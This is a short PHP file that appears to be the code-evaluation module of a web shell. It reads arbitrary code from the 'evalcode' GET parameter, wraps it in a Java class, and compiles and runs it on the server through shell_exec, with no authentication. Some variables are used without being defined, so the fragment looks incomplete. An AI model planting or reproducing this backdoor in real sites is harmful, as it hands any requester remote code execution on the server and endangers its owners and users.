<?php
function exe($s_c){
    $s_out = "";
    $s_c = $s_c." 2>&1";

    if(is_callable('shell_exec'))
        $s_out = @shell_exec($s_c);
    
    return $s_out;
}

$s_code = $_GET['evalcode'];
$s_tmpdir = getcwd();

$s_script = $s_rand;
$s_code = "class ".$s_rand." { ".$s_code . " } ";
file_put_contents($s_script.".java", $s_code);
$s_res = exe("javac ".$s_script.".java");                   
$s_res .= exe("java ".$s_evaloption." ".$s_script);
unlink($s_script.".class");
unlink($s_script.".java");

?>